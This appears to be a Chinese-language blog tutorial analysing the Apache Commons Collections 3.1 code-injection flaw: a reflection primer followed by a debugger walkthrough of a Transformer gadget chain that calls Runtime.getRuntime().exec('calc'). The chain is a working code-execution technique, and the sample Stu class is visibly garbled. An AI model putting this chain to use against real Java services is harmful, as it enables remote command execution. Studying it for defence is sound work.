代码注入漏洞

前言

  • Apache Commons collections是java的一个组件,是java.util.Collection的扩展。其3.1版本有一段利用反射来完成特定功能的代码，控制相关参数，就可以进行代码注入。

准备

  • 首先下载环境包，并且添加进库里。
  • 以下是实例代码。

结果

分析

  • 首先我们得知道java的反射原理，java可以通过反射去获取类的信息，如构造方法，成员方法，和成员属性。我们可以通过反射去获取我们想要的某个类的某个方法并且去执行。
//自定义类
public class Stu {

        this.name="ok";
    }
    public void ok()

        System.out.println("ok");
    }
}

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Test3 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Class cls = Class.forName("Stu"); //获取类
        Constructor constructor = cls.getConstructor();//获取构造方法
        Object o = constructor.newInstance();//实例化一个对象
        Method ok = cls.getMethod("ok");//获取名为ok的方法
        ok.invoke(o);//执行
    }
}

  • 这段代码是在entry.setValue("test");执行的时候完成了代码注入，这个test可以是任意值，我们打断点。
  • 步入
  • 我们发现这里调用了this.valueTransformer类的transformer方法。而this.valueTransformer的值在构造函数里被赋值。
  • 在实例代码种有如下代码
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),//需要执行的目标类
                new InvokerTransformer(
                        "getMethod",            //方法名
                        new Class[]{String.class,Class[].class},//参数类型
                        new Object[]{"getRuntime",new Class[0]}//参数值
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}

                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        
Transformer transformerChain = new ChainedTransformer(transformers);

Map transformMap = TransformedMap.decorate(mp,transformerChain,transformerChain);

  • 这边调用了 TransformedMap的decorate方法，其功能就是返回一个实例化的TransformeedMap对象，其构造函数的值为mp,transformerChain,transformerChain，其中valueTransformer就为transformerChain。

  • 而这里的transformerChain是ChainedTransformer的实例化对象，其构造函数的值为transformers。

  • transformers是一个数组，其中的参数为我们要执行的目标类的信息。

  • 我们继续步入，由于valueTransformer是ChainedTransformer的实例化对象，这里调用了ChainedTransformer的transformer方法。

  • 这里的this.iTransformers为我们传入的transformers素组，循环调用数组里，每个对象的transformer方法，首先是调用ConstantTransformer的transformer方法。
  • 可以看到返回了this.iConstant，而this.iConstant的值为我们一开始实例化传入的Runtime.Class。然后赋值给object
  • 可以看到object已经被赋值为了Runtime,这时候调用的是InvokerTransformer的transformer方法。
  • 这里就是整个利用的核心，input是我们传入的runtime类，获取其class值赋值给cls。
  • cls为class.java.lang.Class。接下来获取方法，方法名就是我们传入的getMethod。
  • 参数类型为String,Class[]。然后通过invok去执行。最后返回一个执行的object对象。
  • 以此类推，整体的利用顺序如下
Runtime.getRuntime()
Runtime.getMethod("getRuntime")
-> Runtime.getMethod("getRuntime").invoke()=Runtime .getRuntime
-> Runtime.getRuntime.getMethod("exec")
-> Runtime.getRuntime.getMethod("exec").invoke=Runtime.getRuntime.exec
-> Runtime.getRuntime.exec("calc");
